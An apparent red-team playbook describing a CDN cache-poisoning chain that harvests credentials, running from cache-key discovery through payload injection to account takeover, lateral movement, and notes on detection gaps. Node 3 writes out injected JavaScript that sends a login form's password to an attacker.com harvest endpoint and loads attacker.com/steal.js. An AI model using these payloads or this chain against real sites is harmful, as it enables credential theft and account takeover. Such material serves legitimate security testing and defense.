# Chain: CDN Cache Poisoning + Key Collision → Credential Harvesting

Tags: cdn, caching, cache-poisoning, cache-key-collision, varnish, cloudflare, reverse-proxy, http-response-splitting, credential-harvesting, web

Chain Severity: High

Entry Condition: CDN or reverse proxy in use (Varnish, Cloudflare, nginx, AWS CloudFront); cache enabled on authentication pages or redirects; Host header, X-Forwarded-For, or similar cache-key header user-controllable; Set-Cookie or Location headers modifiable

## Node 1 — Cache Key Enumeration
Technique: [[Web/Caching#CDN Cache Key Discovery]]
Strike Vector: "cache key composition discovery"
Condition: Target URL known (login page, password reset form); proxy traffic visible in Caido
Standalone Severity: Low
Branches:
  - Craft requests with varying Host headers, X-Forwarded-Host, X-Forwarded-For, referer values; monitor responses for Vary or Cache-Key headers → cache key components identified → Node 2
  - X-Cache: HIT/MISS returned → cache is active; vary on Host or URI only (common pattern) → Node 2
  - Cache-Control: no-cache or private on auth pages → caching likely disabled → [TERMINAL] Cache bypass not exploitable; pivot to session fixation or other auth bypass

## Node 2 — Cache Key Collision Discovery
Technique: [[Web/Caching#CDN Cache Key Discovery]]
Strike Vector: "cache collision via header manipulation"
Condition: Cache key components identified (e.g., Host, URI, method); target auth endpoint known
Standalone Severity: Med
Branches:
  - Send request with `Host: attacker.com` and `X-Forwarded-Host: victim.com` → response cached under attacker-controlled key, but victim.com origin header leaked in Set-Cookie → collides when victim.com requests same URI → Node 3
  - Vary header includes User-Agent or Accept-Language → vary request twice with different User-Agent but same host; one response cached, second response misses → collision possible across user types
  - Vary header includes Authorization → different auth tokens produce separate cache entries → switch to Node 3 without auth collision

## Node 3 — Malicious Payload Injection
Technique: [[Web/Caching#CDN Cache Key Collision → Payload Injection]]
Strike Vector: "inject malicious payload into cached response"
Condition: Cache collision confirmed; attacker can request target URL and receive cached response; response content-type is HTML or JSON (modifiable)
Standalone Severity: High
Branches:
  - Craft login form request with injected JavaScript in query parameter: `?redirect=javascript:fetch('https://attacker.com/harvest?creds='+btoa(document.querySelector('[name=password]').value))` → response cached → Node 4
  - HTML response includes user-controlled query params in page (e.g., `<title>{{ title }}</title>`) → inject: `<script src=https://attacker.com/steal.js></script>` → cached
  - JSON response (e.g., API error message) contains user input → inject payload in error text; if frontend renders as HTML, script executes

## Node 4 — Serve Cached Poisoned Response to Victim
Technique: [[Web/Caching#CDN Cache Key Collision → Payload Injection]]
Strike Vector: "victim receives poisoned cached page"
Condition: Malicious payload cached; victim visits target URL (login page) or is redirected to it via phishing email
Standalone Severity: High
Branches:
  - Victim visits `https://victim.com/login` → CDN serves cached response with attacker-injected JavaScript → form submission intercepted → credentials POSTed to attacker server → Node 5
  - Victim uses different browser or device → Set-Cookie domain mismatch; poisoned response served but script blocked by CORS or CSP → modify payload to use form-level action hijacking (`form.onsubmit = ...`) instead of fetch
  - Cache TTL expired before victim visits → re-poison cache by triggering collision again; use social engineering (email, SMS) to time victim visit

## Node 5 — Credential Capture & Account Takeover
Technique: [[Web/Caching#Credential Harvesting]]
Strike Vector: "credential exfiltration via harvester endpoint"
Condition: Victim submits credentials; attacker server receives POST with plaintext username/password
Standalone Severity: High
Branches:
  - Credentials captured → attacker logs into victim account → admin panel, API access, or data exfil → [TERMINAL] Chain Complete (High)
  - Multi-factor authentication (MFA) enabled → credentials alone insufficient; MFA token/TOTP required → pivot to MFA bypass (SMS interception, social engineering, device registration)
  - Session cookie captured instead of password → use session token to access account directly (cookie theft via cache poisoning on Set-Cookie)

## Node 6 — Lateral Movement & Persistence (Optional Escalation)
Technique: [[Web/Caching#Cache Poisoning → Persistence]]
Strike Vector: "cross-domain cache exploitation for multi-account takeover"
Condition: Single victim account compromised; same CDN used across multiple domains in same organization
Standalone Severity: High
Branches:
  - Discover additional domains under same CDN (e.g., via DNS enumeration or HTTP header `Via: CloudFlare`) → repeat cache poisoning on secondary domains (internal portals, admin panels, HR systems) → harvest credentials from users logging into secondary systems
  - CDN origin servers share session stores → stolen session token valid across primary and secondary domains → escalate to admin or privileged account

## Detection & Logging Gaps
- CDN cache hits often not logged on origin server — only cache misses trigger origin access logs
- Referer and User-Agent variation typically not logged; cache key collisions are silent
- Set-Cookie or Location header injection via query params often not WAF-detected (appears legitimate from origin perspective)
- MIME type sniffing (e.g., cached HTML served as JSON) may bypass content-type validation
